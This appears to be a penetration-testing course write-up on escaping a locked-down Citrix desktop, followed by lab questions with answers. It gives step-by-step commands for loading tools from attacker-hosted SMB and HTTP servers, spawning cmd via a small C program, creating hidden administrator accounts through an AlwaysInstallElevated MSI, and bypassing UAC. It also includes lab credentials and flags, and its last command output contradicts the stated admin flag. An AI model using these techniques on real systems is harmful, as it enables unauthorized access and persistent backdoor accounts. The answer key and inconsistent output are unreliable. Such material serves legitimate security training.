# Citrix Breakout
Citrix is a virtualization environment.

Basic Methodology for break-out:

- Gain access to a `Dialog Box`.
- Exploit the Dialog Box to achieve `command execution`.
- `Escalate privileges` to gain higher levels of access.

## Bypassing Path Restrictions
Group policy has been implemented to restrict users from browsing directories in the `C:\` drive using File Explorer.

Run `Paint` from start menu and click on `File` > `Open` to open the `Dialog Box`. With the windows dialog box open for paint, we can enter the UNC path `\\127.0.0.1\c$\users\pmorgan` under the File name field, with File-Type set to `All Files` and upon hitting enter we gain access to the desired directory.

## Accessing SMB share from restricted environment
Having restrictions set, File Explorer does not allow direct access to SMB shares on the attacker machine, or the Ubuntu server hosting the Citrix environment. However, by utilizing the UNC path within the Windows dialog box, it's possible to circumvent this limitation.

Start a SMB server from the Ubuntu machine:

```shellsession
# smbserver.py -smb2support share $(pwd)
```

Back in the Citrix environment, initiate the "Paint" application via the start menu. Proceed to navigate to the "File" menu and select "Open", thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as `\\10.13.38.95\share` into the designated "File name" field. Ensure that the File-Type parameter is configured to "All Files." Upon pressing the "Enter" key, entry into the share is achieved.

Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a cmd console will be opened.

The executable pwn.exe is a custom compiled binary from pwn.c file which upon execution opens up the cmd.

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory.

```powershell
PS C:\Users\pmorgan\Desktop> powershell -ep bypass
PS C:\Users\pmorgan\Desktop> xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .
```

## Alternate Explorer
In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like Q-Dir or Explorer++ can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.

## Alternate Registry Editors
Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy.

## Modify existing shortcut file
Unauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the `Target` field.

The following steps outline the process:

1. `Right-click` the desired shortcut.
2. Select `Properties`.
3. Within the `Target` field, modify the path to the intended folder for access (`C:\Windows\System32\cmd.exe`).
4. Execute the `Shortcut` and cmd will be spawned

One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under [Interacting with Users](https://academy.hackthebox.com/module/67/section/630) section under `Generating a Malicious .lnk File` tab. 

## Script Execution
When script extensions such as .bat, .vbs, or .ps are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. 

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command "cmd" into the file.File Explorer window showing Desktop folder. Notepad open with file 'evil.bat' containing the text 'cmd'. File size is 3 bytes.
4. Save the file.

Upon executing the "evil.bat" file, it will initiate a Command Prompt window.

## Escalating Privileges
Once access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. For instance, tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.

Using `PowerUp.ps1`, we find that `Always Install Elevated` key is present and set.

We can also validate this using the Command Prompt by querying the corresponding registry keys:

```cmd
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1
```

Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.

```powershell
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
    
Output Path
-----------
UserAdd.msi
```

Now we can execute `UserAdd.msi` and create a new user `backdoor`:`T3st@123` under `Administrators` group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.

Back in CMD execute runas to start command prompt as the newly created backdoor user.

```cmd
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

## Bypassing UAC
Even though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC).

```cmd
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

```powershell
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

### Additional resources worth checking:
- [Breaking out of Citrix and other Restricted Desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
- [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)

## Questions
RDP to 10.129.205.244 (ACADEMY-CITRIX-ATTCK), with user `htb-student` and password `HTB_@cademy_stdnt!`

Visit http://humongousretail.com/remote/ using the RDP session of the spawned target and login with the provided credentials below. After login, click on the `Default Desktop` to obtain the Citrix `launch.ica` file and open it in order to connect to the restricted environment.

```
Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
```

1. Submit the user flag from C:\Users\pmorgan\Downloads **Answer: CitR1X_Us3R_Esc@p3**
   - Found a shortcut in the dekstop, modify its destination to `C:\Windows\System32\cmd.exe` and activate it to gain access to the `cmd`:
        ```cmd
        C:\Users\pmorgan\Desktop> more ../Downloads/flag.txt
        CitR1X_Us3R_Esc@p3
        ```
2. Submit the Administrator's flag from C:\Users\Administrator\Desktop **Answer: C1tr!x_3sC@p3_@dm!n**
   - On the remote, download `PowerUp.ps1` and host it using `python -m http.server`
   - In Citrix, open up the browser and download the `PowerUp.ps1`
   - Import module and run the `UserAdd.msi` to add a new user (`pucavv`:`Hacked123!`) in the Administrator group (make sure to bypass script execution policy with `powershell -ep bypass`):
        ```cmd
        C:/Users/Public> powershell -ep bypass
        PS C:/Users/Public> Import-Module .\PowerUp.ps1
        PS C:/Users/Public> Write-UserAddMSI
            
        Output Path
        -----------
        UserAdd.msi
        PS C:/Users/Public> .\UserAdd.msi
        ```
   - Run as the newly created user and bypass UAC with `Bypass-UAC.ps1` to read the flag:
        ```cmd
        C:/Users/Public> runas /user:pucavv cmd.exe
        C:/Users/Public> powershell -ep bypass
        PS C:/Users/Public> Import-Module .\Bypass-UAC.ps1
        PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
        PS C:\Users\Public> cat C:\Users\Administrator\Desktop\flag.txt
        CitR1X_Us3R_Esc@p3
        ```